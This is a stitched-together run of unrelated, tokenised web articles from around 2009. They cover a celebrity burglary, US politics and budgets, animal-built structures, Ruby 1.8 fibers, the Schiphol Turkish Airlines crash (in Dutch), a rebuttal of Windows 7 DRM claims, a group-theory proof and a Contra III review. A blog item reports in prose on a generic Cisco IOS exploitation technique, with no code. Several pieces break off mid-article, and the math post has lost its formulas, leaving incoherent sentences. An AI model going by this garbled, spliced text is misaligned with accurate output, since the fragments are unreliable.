Audrina Patridge Catches Thieves on Tape
The Hills starwas robbed sometime over the weekend and lucky for her , she has a surveillance camera that captured the crooks on tape .
There is yet to be a happy ending to this story , but the tape is a start .
Audrina filed a report with the LAPD at 2:00 a.m. on Monday morning .
Reports are saying that the crime happened around midnight .
The actress wrote about the incident on her website and included the surveillance footage :
" My house was broken into over the weekend but luckily my surveillance camera caught the burglary on tape .
I spent most of the morning filling out police reports and going through the house room by room making a list of everything that had been taken .
Most of the items are replaceable , but they took off with a few very sentimental things too .
Definitely not a good way to start the week . "

San Francisco trade unionists support boycott of apartheid Israel , protest in soldarity with the Palestinian people , January 10 , 2009 .
WASHINGTON  A group of liberal bloggers said it was teaming up with organized labor and MoveOn.org to form a political action committee that would seek to push the Democratic Party further to the left .
Soliciting donations from their readers , the bloggers said they were planning to recruit liberal candidates to challenge more centrist Democrats currently in Congress .
The formation of the group is another step in the evolution of the blogosphere , which has proven effective at motivating party activists to give money and time to political campaigns , especially in local races .
But it also illuminates a deepening wrinkle for President Obama , whose attempt to build a broad governing coalition  often by tempering some of his more liberal positions  has already angered some of his supporters on the left .
So you thought the ancient and modern wonders created by mankind and creative contemporary architecture were something ?
From underground ant colonies that extend farther than the Great Wall of China to termite mounds that tower at nearly twice the relative height of the Burj Dubai ( tallest skyscraper in the world ) , and from the largest multi-species spider web ever discovered to the longest beaver dam on the planet , here are seven of the most awe - inspiring animal architects and architectonic structures of the animal kingdom .
1 ) Towering Termites : Massive Earth Movers
( Source – Images via : nma , mcmillan and airninja )
Termites are amazing creatures by almost any metric .
Their queens are 30 times the size of normal soldiers and workers and produce about 30 eggs per minute to keep the colony alive .
Relative to their size , termites build the biggest structures of the animal kingdom – . 4 inch creatures constructing towers weighing hundreds of tons and up to 25 feet in height and 40 feet in diameter ( the human equivalent of 4,600 feet tall ) .
And that is just 40 feet above the ground – termites can also burrow as far as 225 feet underground .
2 ) Social Weavers : Avian Condo Architects
( Source – Images via : panoramio , webshots and flickr )
The so - called social ( or sociable ) weaver bird is one of the friendliest flyers in the sky .
They combine forces and take over entire trees to make what can only be considered something like an awesome animal ‘ apartment ’ structure .
Instead of building independent nests , up to 300 pairs of birds come together to build giant mega - nests up to 25 feet wide , 5 feet high and with an individual room for every couple .
As with a huge condo complex , there are multiple ‘ basement ’ entrances that lead up through clusters of chambers .
3 ) Naked Mole Rats : Uncanny Underground Diggers
The naked mole rat goes by many names , including the potentially misleading “ sand puppy ” which might imply that these voracious diggers are cute and friendly fellows .
They are uniquely eusocial amongst mammals , meaning they are hive - like and massively organized creatures like ants , bees , wasps and termites only much much larger and scarier looking .
To add to their eeriness , they are essentially cold - blooded and feel absolutely no pain .
Up to 100 of these strange creatures live together in a single underground habitat , which they dig with disproportionately gigantic sets of teeth that are placed in front of ( rather than behind ) their lips so they do n’t swallow dirt .
Naked mole rats can live for up to 28 years and colonies feed on tubers ( engorged plant parts ) that weigh up to 1000 times as much as an individual mole rat does .
4 ) Ants : Super - Strong Subterranean Excavators
The largest ant colony discovered to date stretches over 4000 miles across Europe – this super - colony is suspected to have billions of ants .
Everyone knows that ants are incredible builders that can carry many times their own weight but few have gotten to see inside their spectacular subterranean structures .
The particular colony shown above is 500 square feet in size , penetrates 25 feet into the ground and required the displacement of 40 tons of dirt to be created .
As it was dug up , transit tunnels and ventilation inflow and outflow shafts were revealed as well as fungus gardens and trash pits .
Be sure to watch the scientists unearth this monstrous architectural undertaking in this amazing video .
5 ) Caddisflies : Unique Underwater Builders
( Source – Images via : hunterian , cirrusimage , whatsthatbug )
Unlike most of the intriguing animals and animal architecture in this list the caddisfly and its buildings are not massive communally - constructed mega-structures .
On the contrary , the caddisfly makes relatively minute architecture but does so with remarkable versatility and ( perhaps a stretch ) artistic license .
Using whatever materials are available – from sand and shells to twigs and trash – the larval form of these so - called “ underwater architects ” build themselves mobile “ shells ” to protect them and provide natural camouflage ( made from local materials ) as they develop .
Eventually , they grow mandibles and swim to the surface where they discard their unique architectural creations , flex their wings and fly away .
6 ) Dual - Built Beaver Dam : Longest in the World
The longest recorded beaver dam in the world spans 2800 feet and has existed for over a decade .
From the aerial images it is clear that at least two beaver families have worked in tandem in the construction of the record - setting structure .
The nature of the wetland is such that long dams are needed to trap broad stretches of low - flowing water .
Other dams in the area have been sized at up to 1500 + feet but at nearly 3000 feet this two - family dam is a one - of - a- kind discovery .
7 ) Communal Spider Web : Biggest in the World
Thousands of spiders from twelve species worked together to construct this amazing web that spans over 600 feet .
This is highly unusual behavior for spiders that normally fight over territory and prey , preferring to eat their enemies and build independent , solitary circular webs .
However , record rainfalls provided such an abundance of edible insects that ( scientists speculate ) the spiders chose cooperation over conflict in this extraordinary case of evolutionary adaptation .
Even more exceptional : the spiders did not just build it in the first place but have actually rebuilt the web three times after wind and rain has destroyed it .

MP Geert Wilders said on Wednesday he would press ahead with plans to visit Britain on Thursday despite an official entry ban by the British government .
‘ I will get on a plane tomorrow and see what happens , ’ Wilders told the BBC .
‘ I will not accept that an elected politician can be refused entry . ’
The British peer who invited Wilders to London to show his 15 - minute film Fitna says he is shocked by the British government ’s ‘ weak ’ decision to ban the Dutch MP .
Malcom Pearson told the BBC that while he does not agree with Wilders ’ call for the Koran to be banned , he would ‘ defend his right to say what he has said ’ .
The aim of the film showing at the British upper house of parliament was to encourage discussion and would go ahead without Wilders , Pearson said .

With Ruby 1.9.1 , the stable version of Ruby 1.9 is now available , yet many are still reluctant to switch , be it for lack of 1.9 compatible libraries or uneven tool support .
Ruby 1.8.6 will be maintained for the near future , despite the fact that Ruby 1.8.7 has been available for quite some time .
Ruby 1.8.7 caused some debate because it backported some features from 1.9 and also had some breaking changes ( compared to 1.8.6 ) , which also prompted the JRuby team to skip Ruby 1.8.7 support for the moment ( although that might change ) .
The debates about the future of the 1.8.x branch was restarted recently , partly because Ruby 1.8.8 is supposed to be released later this year .
In this discussion , the maintainer of Ruby 1.8.7+ , Akinori MUSHA , posted a rationale for the plans for 1.8.8 :
1.9 is the only future and 1.8.6 or prior is the ancient past for you .
1.8.7 is the past too , but you might as well support ruby 1.8.7 + as an extra gift for not - ready - to - move users only if you feel it 's not too hard .
In ruby 1.8.8 , syntactic compatibility will be added to make it even easier to write code for both 1.9 and 1.8.8 + in a single source file without compromising optimizations for 1.9 .
If you still need to write code for 1.8.6 but have some intention to support 1.9 in future , then try running your program under ruby 1.8.7 and the forthcoming ruby 1.8.8 with a warning option ( - w ) as a start .
While the official 1.8.7 has a few backported features from Ruby 1.9.1 , there are other ways to make use of 1.9.1 features .
Very useful are Fibers in 1.9.1 , which have been used for some significant scalability improvements to Ruby database adapters .
NeverBlock added 1.8.x support with " Poor Man 's Fibers " to its library .
Now this port is available in the form of patches against 1.8.6_p287 and 1.8.7_72 :
At Kickball Labs , Aman Gupta ( http://github.com/tmm1) and I ( http://github.com/ice799) [ Joe Damato ] have been working on an implementation of Fibers for Ruby 1.8. {6,7} .
It is API compatible to Fibers in Ruby 1.9 , except for the " transfer " method , which is currently unimplemented .
This patch will allow you to use fibers with mysqlplus and neverblock .
So if Mr. Obama gets us out of Iraq ( without bogging us down in an equally expensive Afghan quagmire ) and manages to engineer a solid economic recovery  two big ifs , to be sure  getting the deficit down to around $ 500 billion by 2013 should n’t be at all difficult .
But wo n’t the deficit be swollen by interest on the debt run-up over the next few years ?
Not as much as you might think .
Interest rates on long - term government debt are less than 4 percent , so even a trillion dollars of additional debt adds less than $ 40 billion a year to future deficits .
And those interest costs are fully reflected in the budget documents .
So we have good priorities and plausible projections .
What ’s not to like about this budget ?
Basically , the long run outlook remains worrying .
According to the Obama administration ’s budget projections , the ratio of federal debt to G.D.P. , a widely used measure of the government ’s financial position , will soar over the next few years , then more or less stabilize .
But this stability will be achieved at a debt - to - G.D.P. ratio of around 60 percent .
That would n’t be an extremely high debt level by international standards , but it would be the deepest in debt America has been since the years immediately following World War II .
And it would leave us with considerably reduced room for maneuver if another crisis comes along .
Furthermore , the Obama budget only tells us about the next 10 years .
That ’s an improvement on Bush - era budgets , which looked only 5 years ahead .
But America ’s really big fiscal problems lurk over that budget horizon : sooner or later we ’re going to have to come to grips with the forces driving up long - run spending  above all , the ever - rising cost of health care .
And even if fundamental health care reform brings costs under control , I at least find it hard to see how the federal government can meet its long - term obligations without some tax increases on the middle class .
Whatever politicians may say now , there ’s probably a value - added tax in our future .
But I do n’t blame Mr. Obama for leaving some big questions unanswered in this budget .
There ’s only so much long - run thinking the political system can handle in the midst of a severe crisis ; he has probably taken on all he can , for now .
And this budget looks very , very good .

This is an interesting development in router security , Cisco bugs have been popping up now and then – not that often – but usually when they do they are quite serious .
The problem with them was you needed so many variations unless you were just targeting one specific router , with that specific version of IOS and hardware .
Now someone has applied the ‘ Write Once , Run Anywhere ’ programming principle to Cisco exploits enabling one exploit to run on a far wider variety of Cisco platforms than was previously possible .
This is quite serious as most of the Internet architecture is based at some point of peering on a Cisco device .
A researcher has discovered a way to reliably exploit a known security vulnerability in a wide class of Cisco System routers , a finding that for the first time allows attackers to hijack millions of devices with a single piece of code .
The discovery by Felix “ FX ” Lindner of Recurity Labs in Berlin brings the write - once - run - anywhere approach of software development to the dark art of compromising routers that form the core of the internet .
Previously , reliable exploit code had to be specifically fashioned to one of more than 15,000 different supported builds of IOS , or Internet Operating System , which run various Cisco devices .
“ What FX has shown , conclusively , is that when something comes out that can potentially compromise your router , you have to get on it as you would get on a remote vuln , for , say , your domain controllers or database servers , ” said Dan Kaminsky , a fellow researcher who has reviewed Lindner ’s findings ( PDF ) .
“ Router infrastructure has been conclusively proven to be as generically vulnerable as commodity operating systems . ”
FX who is better known from his association with Phenoelit recently demonstrated his findings at CCC ( Chaos Communication Congress ) with a known vulnerability .
If this gets into the wrong hands it could be bad new , but then as always I would assume it ’s already in the wrong hands and has been for time ( and they ’ve been using it ) under the radar .
The problem with routers is that once comprised subtle changes can be made to the routing tables and firewall rules that can severely compromise a network and be very hard to detect .
Each image version of IOS loads programs in substantially different parts of the device ’s memory .
Until now , the randomization made it virtually impossible for weaponized exploit code to know ahead of time where to stash malicious payloads for the specific device it was targeting .
Lindner was able to work through this limitation by observing the behavior of software known as ROMmon , which is analogous to the ubiquitous bios software found on personal computers .
By using small chunks of ROMmon , Lindner has shown that it ’s possible to drop code into specific memory locations and then execute it .
At last week ’s Chaos Communication Congress he used the technique to reliably exploit a known vulnerability across a wide class of Cisco routers .
The exploit disabled the devices ’ CPU caches and instead got them to load his own code .
The method works on any Cisco device that uses a PowerPC processor , which includes the widely used 2600 and 17000 series routers .
He has yet to find a similarly reliable way to attack Cisco gear that uses MIPS microprocessors , but said he is close .
In the last part of the article they raise a very good point , it is extremely hard to update a router with IOS , especially the older ones as it can really b0rk the configuration and leave you in a heap of trouble .
During many audits I ’ve found core Cisco devices running horribly out of date software with serious remote exploits .
I hope Cisco addresses this and makes it easier for their clients to keep running a secure version .

In a country full of iconoclastic game designers , Japan 's Keita Takahashi somehow manages to stand out even more .
He gives press conferences barefoot .
He does n't like having his picture taken — his office could n't get us one .
He dreams of someday designing a playground .
And he does n't even play videogames .
" There are n't really any I like , " Takahashi says .
Instead , the 33 - year - old designer just watches trailers for upcoming games .
" The camera work and cut scenes are amazing , " he says .
And yet , somehow , Takahashi managed to create Katamari Damacy , one of the most innovative , charming and addictive games of the past few years .
On Thursday , Namco Bandai will release Takahashi's latest creation : Noby Noby Boy , a downloadable game for PlayStation 3 that turns you into a giant , gummy tapeworm .
The strangeness of the game is one reason * Noby Noby Boy * will be exclusive to Sony 's system .
" Going multiplatform for a vague , off - beat , new title is risky , " Takahashi says .
Another factor :
The PlayStation 3 controller 's right and left thumbsticks are symmetrical , which Takahashi calls perfect for Noby Noby Boy 's weird gameplay .
When asked what makes Noby Noby Boy different , Takahashi replies that he had not thought at all about marketing or sales when coming up with the game 's design .
Perhaps that 's why it 's so hard to describe .
You play as the eponymous Boy , a rubbery , candy - colored , four - legged critter who snakes around a board - gamelike town devouring things and growing longer and longer .
Did any other games inspire Noby Noby Boy ?
Of course not .
" Even though I have n't played the actual game , " says Takahashi , " we consulted the opening camera work in a trailer for Dirt , a racing game , for Noby Noby Boy . "
Takahashi has a history of making bizarre games with no apparent influences .
Released in 2004 on the PlayStation 2 , Katamari Damacy follows a 10 - centimeter - tall Prince who has traveled to Earth to collect enough materials to re-create the universe — which was wiped out after his father , the King , went on a drinking bender and smashed everything up .
Literally translating to " clump of soul , " Katamari Damacy has players roll a sticky sphere that picks up any objects it touches ( chopsticks , cows and even clouds ) as the lump increases in size like a snowball .
Instead of drawing upon hackneyed gaming conventions , Katamari
took its inspiration from everything from Picasso to Playmobil .
It did OK in its native Japan , but became a sleeper hit in the United States .
Namco
Bandai produced a small initial run for the U.S. release .
After the game sold out completely , the company scrambled to get Katamari back on shelves .
" I never fathomed Katamari becoming popular abroad , " says Takahashi .
" I was completely surprised . "
Even better , it was a bargain :
In an age where the skyrocketing development cost of many games is approaching that of big - budget Hollywood flicks , Takahashi and his team churned out * Katamari Damacy * on the cheap for a mere $ 1 million .
As Katamari became an international brand - name franchise , spawning three sequels , Takahashi bowed out .
" When you completely forget the desire to make something new , " he says , " it 's not good for you as a creator — or even as a person . "
So what 's next for Takahashi , if sequels are off the table ?
We do n't know — and as near as we can tell , neither does he .
" What do you think I should do ? " he says .
" Making games is fun , but I also really need to think seriously about the other things I want to do in the game business . "

AMSTERDAM -
Het dodental van de ramp met de Boeing van Turkish Airlines loopt mogelijk nog op .
Zes gewonden uit het vliegtuig dat woensdag bij Schiphol neerstortte , zijn er zo ernstig aan toe dat niet te voorspellen is of zij het overleven .
Lees alles over het ongeluk op de NU.nl - special
Negen doden
Tot nu toe zijn negen doden te betreuren , onder wie zeker drie van de zeven bemanningsleden .
Over de identiteit van de slachtoffers is nog niets bekendgemaakt .
Het vliegtuig was onderweg van Istanbul naar Amsterdam en was in Turkije om 8.25 uur lokale tijd vertrokken .
Alle negen lichamen zijn inmiddels geborgen .
Dat heeft burgemeester Theo Weterings van Haarlemmermeer woensdagavond gemeld op een persconferentie .
Gewonden
Er zijn in totaal 86 gewonden gevallen , van wie zes zeer ernstig .
Hun toestand is kritiek .
Verder zijn 25 patiënten behoorlijk gewond geraakt , 24 mensen kampen met lichte verwondingen .
Van 31 gewonden is nog niet vastgesteld wat de aard van hun verwondingen is .
De gewonden zijn naar ziekenhuizen in onder andere Hoofddorp Leiden , Utrecht en Amsterdam gebracht .
Identiteit
Hij wilde nog geen mededelingen doen over de identiteit van de slachtoffers .
Weterings vermoedt dat daar pas donderdag in de loop van de dag meer over gemeld kan worden .
'' Zorgvuldigheid staat voorop en de familie moet eerst in kennis worden gesteld ' ' , aldus de burgervader .
De autoriteiten willen bovendien de passagierslijst goed controleren .
Op de lijst staan ook Nederlandse namen .
Ook de maatschappij heeft de passagierslijst online geplaatst .
Moederlijst
'' De ervaring leert dat de moederlijst van de luchtvaartmaatschappij niet altijd 100 procent als een vast gegeven kan worden beschouwd '' , zei korpschef Bob Visser van de politie Kennemerland .
'' Er zijn nu rechercheteams onderweg om de identiteit van de mensen in het ziekenhuis te controleren . ''
Hulp
Weterings meldde verder dat omwonenden en automobilisten vanaf de A9 vlak na de crash te hulp zijn geschoten .
In totaal zijn 750 hulpverleners ingezet bij de ramp .
'' Hierdoor is het aantal slachtoffers beperkt gebleven ' ' , aldus de burgemeester .
Het grootste gedeelte van de passagiers had volgens Weterings de Turkse of Nederlandse nationaliteit .
Hoofdofficier van justitie Bob Steensma stelde woensdagavond dat het sporenonderzoek in principe pas donderdag wordt voortgezet .
Dit omdat het onderzoek bij daglicht beter kan worden verricht .
Akker
De Boeing 737 van Turkish Airlines verongelukte nabij de Polderbaan tussen het Rottepolderplein en Schiphol op een akker .
Het toestel brak hierbij in drie delen .
Bekijk de exacte locatie op Google Maps .
Luchthaven Schiphol heeft bevestigd dat er 134 man aan boord van het gecrashte vliegtuig zaten .
Van het vliegtuig is de staart en een motor afgebroken .
Hulpdiensten
De hulpverlening kwam volgens Bezuijen snel en goed op gang .
De hulpdiensten waren snel ter plekke en er is veel materieel vanuit de omgeving ingezet .
Het gecrashte vliegtuig trok veel kijkers .
Volgens Bezuijen leidde dat niet tot grote problemen .
Onderzoek
Volgens Pieter van Vollenhoven , de voorzitter van Onderzoeksraad voor Veiligheid , heeft de bemanning van het vliegtuig geprobeerd het toestel zo lang mogelijk in de lucht te houden .
" Maar als je dan snelheid verliest , dan val je lettelijk uit de lucht .
Het toestel heeft ook geen lang spoor in het weiland getrokken '' , zei hij .
Dat laatste zou erop kunnen wijzen dat de motoren van het toestel waren uitgevallen .
Het onderzoek naar de oorzaak kan maanden , zo niet jaren duren .
De zwarte doos met vluchtgegevens is gevonden , liet Van Vollenhoven weten .
Balkenende
Premier Jan Peter Balkenende is zeer te spreken over de manier waarop de hulpverlening meteen op gang kwam na de vliegtuigcrash bij luchthaven Schiphol .
Er is snel en goed gewerkt , zo maakte hij woensdagavond duidelijk na afloop van een bezoek aan slachtoffers in het Spaarne Ziekenhuis in Hoofddorp .
In het ziekenhuis sprak de premier samen met staatssecretaris Nebahat Albayrak ( Justitie ) een gezin dat de crash had overleefd .
Hij uitte opnieuw zijn medeleven en zei zeer aangedaan te zijn door het '' vreselijke ongeluk ' ' .
Albayrak
Staatssecretaris Albayrak van Justitie is onder de indruk van de verhalen van slachtoffers van de vliegtuigramp bij Schiphol .
'' Het is ontzettend confronterend als je mensen ziet die in het toestel zaten .
Je ziet bijna de angst nog in hun ogen '' , vertelde Albayrak na afloop .
Het van oorsprong Turkse gezin uit Utrecht was volgens haar zeer te spreken over de zorg die hulpverleners boden .
Ook familieleden vertelden dat ze goed zijn opgevangen .
Opvang
De hulpverlening voor de verongelukte vlucht TK 1951 is op de plaats van de ramp bijna afgerond .
Ook de opvang voor gewonde passagiers en hun relaties wordt opgeheven , laten de autoriteiten op Schiphol weten .
Het vliegverkeer op Schiphol is voor een groot gedeelte hervat , meldt het voorlichtingsteam verder .
Ook het wegverkeer op de A9 en de wegen rondom Schiphol verloopt weer nagenoeg normaal .
Informatienummer
Het calamiteitenteam op Schiphol heeft een speciaal informatienummer geopend voor burgers met vragen over de crash .
Het nummer is 0900 - 1852 .
Mensen kunnen daar terecht met vragen over bijvoorbeeld familieleden .
Dat liet een woordvoerder van de marechaussee weten .
Nabestaanden en familieleden van de slachtoffers van het bij Schiphol gecrashte toestel van Turkish Airlines kunnen voor informatie ook bellen met het hoofdkantoor van de luchtvaartmaatschappij in Turkije .
Turkish Airlines heeft een speciaal telefoonnummer geopend : 0090800-21980357 .
Does Windows 7 contain more DRM than Windows Vista ?
Does Windows 7 limit you from running cracked applications , and will it open the firewall specifically for applications that want to check if they ’re cracked or not ?
Does it limit the audio recording capabilities ?
According to a skimp and badly written post on Slashdot , it does .
The Slashdot crowd tore the front page item apart – and rightfully so .
Titled “ Draconian DRM Revealed In Windows 7 ” , the story was written by a user who supposedly had discovered new instances of DRM in Windows 7 .
However , only three seconds of looking at the item was all it took many Slashdot readers to realise that this post was utter nonsense .
As a result , the Slashdot crowd tore it apart .
Supposedly , Windows 7 ’s DRM prevented the user from cracking Photoshop .
The user installed Photoshop CS4 on Windows 7 , and then he went on to fiddle with one of the “ nag DLLs ” of the application .
He replaced the DLL with a cracked version , and was surprised to see that Photoshop would no longer work .
The user was also amazed that Photoshop had added itself to the firewall exception list .
He then went on about Windows 7 locking him out of the “ Local settings ” folder .
Let ’s take a look at this step by step .
Several commenters did it for me , so I did n’t even have to do it myself .
Firstly , messing with DLLs is difficult and dangerous for a reason .
Since many types of malware use DLLs to infect your system , several protection schemes are put in place to prevent this thing from happening .
Of course , replacing a working DLL with a cracked one is asking for trouble in the first place .
Photoshop adding itself to the firewall list is hardly news either .
The Photoshop installer is run as an administrator ( you give it permission to do so explicitly ) and just like countless other applications , it adds a firewall exception to the list ( as a Slashdot reader noted : “ If a program is already running on your computer then it means the firewall is no longer responsible for stopping that application in any way – the firewall only protects against outside threats ” ) .
The one about the “ local settings ” folder is also interesting , as it shows a clear lack of knowledge on Windows : Windows Vista and Windows 7 do not have a “ local settings ” folder .
It ’s in AppDataLocal now – the old “ local settings ” folder is just an NTFS junction now , and since Explorer can’t handle these very well ( bad Explorer ! ) , will give you an access denied message .
The user then dives into Windows 7 ’s audio capabilities .
He writes : “ Under XP you could select ‘ Stereo Mix ’ or similar under audio recording inputs and nicely capture any program then playing .
No longer . ”
This is correct .
Windows 7 ’s default drivers ( he does n’t specify which card ) are limited in functionality , so that the official drivers from the manufacturer can still offer added value .
The stereo mix functionality is probably part of the official drivers that the user did not install .
However , since we do n’t know what card , nor what drivers he used , we ’re in the dark here .
So , what DRM does Windows 7 have ?
It wo n’t be a surprise to learn that it does n’t contain any more DRM than Vista does , and as we all know by now ( well , “ all ” as in people who actually use Vista ) , that DRM is irrelevant .
Protected Video Path and Protected User Mode Audio , the DRM in Windows Vista and Windows 7 , does n’t come into play because , well , little to no media actually make use of it .
As Ars notes :
Though there was plenty of outcry over PUMA and PVP prior to Vista ’s launch , the story is once again a familiar one : most people do n’t notice .
Little or no media actually demands the use of the protected paths , so on most users ’ systems , Windows never invokes them .
Play back unprotected media on a Vista machine and the DRM subsystems simply do n’t get used .
All these Vista DRM features are found in Windows 7 .
But just as with Vista before it , the vast majority of users will never see the DRM in any practical sense ; the features are there just in case Hollywood decides to make use of them .
The overblown , unrealistic , and just plain made up horrors of DRM in Windows Vista never came to pass ( in spite of the huge publicity that the Gutmann diatribe received ) , and so it will be with Windows 7 .
FUD
“ When it comes to bashing Microsoft , it seems that any old canard will do ; facts are strictly optional . ”
That ’s about as best as I ’ve ever seen it summed up .
There is enough wrong with Microsoft and Windows other than these so - called DRM issues ; it ’s sad that various anti-Microsoft advocates have to resort to tactics that they blame Microsoft of : fear , uncertainty , doubt .
There are various users on OSNews who stoop just as low as Slashdot did yesterday , and that ’s sad .
Personally , I have grown very sick of the DRM FUD flown around by Free software enthusiasts .
I try to use Free software wherever I can myself , and I try to make others see the values of it too .
However , I try to stick to the facts , and I try to be honest about the shortcomings of Windows and the strong points of Free software so that my friends and relatives can make an informed decision .
Resorting to FUD hurts the alternatives to Windows and Microsoft .
Please bear that in mind .
Independent Online , a South African news provider is reporting that the revived National Party in South Africa will allow gay and lesbian members to serve , but that the government will help to " rehabilitate " them .
The party is also advocating that the country stop performing same - sex marriages , which became legal in November 2006 .
A NP representative said :
" The party is open to all .
We do n't approve ( of homosexuality ) , but there is nothing we can do about people 's lifestyle .
We wo n't exclude them , we will rather rehabilitate them .
We regard them as South Africans and we will still serve them , " Sprague said .
Contact the National Party via the address and email below and let them know that science shows homosexuality is not a disease in need of treatment and that " reparative therapy " does not work and is dangerous .
Also , tell them not to interfere with the constitution which guarantees marriage rights for same - sex couples .

( CNN ) --
A bank that received $ 1.6 billion dollars of the government 's bailout money sponsored what reports are calling a lavish series of events in Los Angeles , California , last weekend .
Northern Trust sponsored a Professional Golf Association tournament and associated client events .
Northern Trust , based in Chicago , Illinois , spent an undisclosed amount of money sponsoring a Professional Golf Association tournament and associated client events , including concerts , dinners and parties , according to celebrity Web site TMZ.com .
The bank spent millions of dollars on the event , which included -- on top of the sponsorship costs of the Northern Trust Open tournament -- concerts by Sheryl Crow and Earth Wind & Fire , a private party at music venue House of Blues and gift bags from Tiffany & Co. , the Web site said .
Watch splashy concerts , parties »
According to TMZ.com 's report , employees and clients attending the tournament dined on seared salmon and petite Angus filet and stayed at some of Los Angeles ' most elegant and expensive hotels .
Doug Holt , senior vice president of communication for Northern Trust , confirmed to CNN that his bank sponsored the tournament and its events but , he said , not at taxpayer expense .
Holt told CNN that as a " healthy " bank , Northern Trust did not seek the $ 1.6 billion it received from the government as part of the U.S. Treasury 's Capital Purchase Program , but that it " agreed to the government 's goal of gaining the participation of all major banks in the United States . "
" This is the second year Northern Trust is sponsoring the Open as part of a five - year contract , " Holt said .
The contract was signed in 2007 , before the government 's Capital Purchase Program to aid banks came into existence .
Holt also said that the sponsorship is an " integral part of Northern Trust 's global marketing activities , " and as with all marketing , advertising , corporate sponsorship or charitable activities , no taxpayer money was used to fund the weekend events .

But that assurance does n't seem to be enough for some .
Rep. Barney Frank , D - Massachusetts , the House Financial Services Committee chairman , is writing a letter to Northern Trust asking the bank to pay back the money it spent , according to Frank 's spokesman .
" We are asking Northern Trust to repay the government the equivalent of the funds they spent on the tournament and related events , " Steve Adamske of Frank 's staff told CNN .
Northern
Trust announced it was laying off 450 employees in December of last year , with the bank saying the move was part of a number of actions " to better position the company for improved profitability and continued global growth during these difficult economic conditions . "
Last year , Northern Trust earned an operating net income of $ 641 million .

The Bush administration may have passed into history , but its legal briefs linger on .
Earlier this month , a federal court held that an Islamic charity could proceed with a lawsuit alleging it was subject to warrantless surveillance by the NSA — and ordered that the government turn over classified documents for review by the judge .
On the eve of the presidential inauguration , however , the Justice Department filed a motion urging the court to stay that ruling pending an appeal , citing the risk of irreparable harm to national security .
At the heart of the legal battle is a secret document accidentally turned over to lawyers for the Al Haramain Islamic Foundation , showing that the charity — which the government has classified as a " Specially Designated Terrorist Group " — was subject to warrantless surveillance , in violation of the Foreign Intelligence Surveillance
Act as it stood when the surveillance occurred .
The Justice Department successfully argued that the document was protected by the state secrets privilege , and so could n't be used by Al Haramain to establish grounds on which to challenge the legality of the wiretapping .
But Judge Vaughn
Walker , whose court has been hearing both this case and the more widely publicized EFF lawsuits against NSA - friendly telecoms , allowed lawyers for Al Haramain to submit unclassified evidence to establish that they'd been targeted , reasoning that the state secrets privilege was preempted by explicit provisions within FISA allowing " aggrieved persons " to have their cases reviewed in judges ' chambers .
The point of providing for in camera review , after all , was to permit the court to consider documents that would otherwise be state secrets .
Earlier this month , Walker found that Al Haramain had provided enough evidence to trigger the FISA review clause , and ordered the government to both hand over the document that kicked off the litigation , and to begin the process of securing clearances for Al Haramain 's attorneys , so that they could be given limited access to classified information in order to participate in the case .
The Justice Deparment is n't happy with that , and they 're asking Walker to suspend his orders pending an appeal of that ruling .
Noting that " secrecy is a one - way street , " the government 's motion argues that there will be no effective remedy on appeal once privileged information has been disclosed .
Moreover , it argues that even if the " sealed document " at the heart of the case is only reviewed in chambers , any further action in the case would be tantamount to disclosure , because the appellate court recognized the government 's privilege " not merely as to the ' content ' of the sealed document but over the fact of whether or not plaintiffs had been subject to the alleged surveillance . "
That fact , of course , would be implicitly revealed by Walker 's determination of whether the suit should proceed after reviewing the document .
There is , to be sure , an element of farce here .
Not only has the document itself already been seen by uncleared parties , but as plaintiffs ' attorney Jon Eisenberg observed this summer , copies of the document were sent to members of Al Haramain 's board of directors located overseas .
As far as anyone knows , those copies have not been retrieved .
The government appears to be trying to close the barn door after the horse has not only left , but boarded a plane to Saudi Arabia .
Still more dismaying to the government is the prospect of further disclosures to Al Haramain 's attorneys .
Even if those lawyers were granted security clearances , the motion notes , actual access to classified documents typically requires a further " need to know " determination by an executive branch official .
" The NSA Director has further determined , " the motion somewhat drily observes , " that it does not serve a governmental function ... to disclose the classified NSA information at issue in this case simply to assist the plaintiffs ’ counsel . "
The DOJ also takes issue with Walker 's broader legal reasoning .
" No court , " the motion argues , " has held that an assertion of the state secrets privilege is preempted by statutory law — an issue that is plainly of constitutional dimension because the judgment made by Executive branch officials responsible for national security matters to protect certain information is rooted in the Article II powers of the President . "
Attorneys for both Al Haramain and the Justice Department — now part of the Obama administration — will appear before Walker in a hearing this Friday .
Problem :
Show that the group defined by the presentation is infinite .
If you are familiar with the definition of a group presentation , this problem should seem intuitively obvious to you .
But it is remarkably hard to come up with a good proof .
A first idea might be : show that the elements are distinct .
But to do this we need to prove that there is no sequence of basic operations on the constraints that will allow us to conclude , for example , that .
It is certainly not immediately clear how to prove this , and a rigorous proof will probably involve several painful lemmas about words from the set and when they can be equal to the identity .
There is another way to proceed , which is more abstract and seems to be more standard in algebra , and that is to appeal to the universal property of free groups .
A free group on a set can be defined loosely as the group of words in elements of , where the group operation is concatenation , taking care to add inverses and enforce relations like .
But we can also refer to free groups by the following universal property :
If is any group and is any set map , then there exists a unique group homomorphism such that the following diagram commutes :
( let me know if you know how to make less ugly LaTeX diagrams in WordPress )
Here is simply the natural inclusion map , and by commutes we just mean that .
How can we use this ?
Well , our original group can ( and should ! ) be defined as a quotient , where is the free group on and is the normal closure of .
It would help if we could construct a surjective homomorphism from onto some infinite group , ( you could call this a realization of the group ) and indeed , the universal property allows us to do this .
One such realization is , in .
( this is the projective special linear group )
These matrices are chosen so that their product has infinite order .
What we would like to say is that there exists a homomorphism from to that maps and as above , but we do not know a priori that simply declaring this map will produce a well - defined homomorphism .
Here is where the universal property comes in .
We can clearly define the map by , , and apply the universal property to produce a map that maps to and to .
If we can show that , then will naturally induce a map .
But this is easy to verify : , ( remember that and generate ) so we have now produced a map such that has infinite order in .
It follows that has infinite order and we are done .
It is important to realize that we can do exactly this sort of realization whenever we can identify a group with generators that satisfy relations consistent with the relations in .
Furthermore , this approach is generalizable to many other situations where universal properties are involved , ( tensor products , for example ) and helps us avoid the ( sometimes messy ) definitions of the objects involved .
On an intuitive level , all that has been said here is : whenever a group is given by a presentation and a group has generators consistent with that presentation , is a homomorphic image ( hence a quotient ) of .
The use of this fact is a key proof technique for problems like the one above , in which we essentially need to prove that a certain structure is not too degenerate .

The war that the world forgot ...
BADASS three - headed alien skull boss .
B ack when men were men and video game characters still had manly hair cuts , one game stood out from the crowd as being the manliest : Contra III : Alien Wars .
Everything about this game is no joke .
Right off the bat , your character starts out with a rapid fire machine gun and an invincibility barrier for 15 seconds of invincibility so you do n't have to put up with any bullshit cheap shots while you 're getting accustomed to the controls ( emphasis on you , since I 've mastered the controls to every video game I 've ever played and have yet to play ) .
You wo n't find any 5 - minute loading times or 45 - minute introductions in this game .
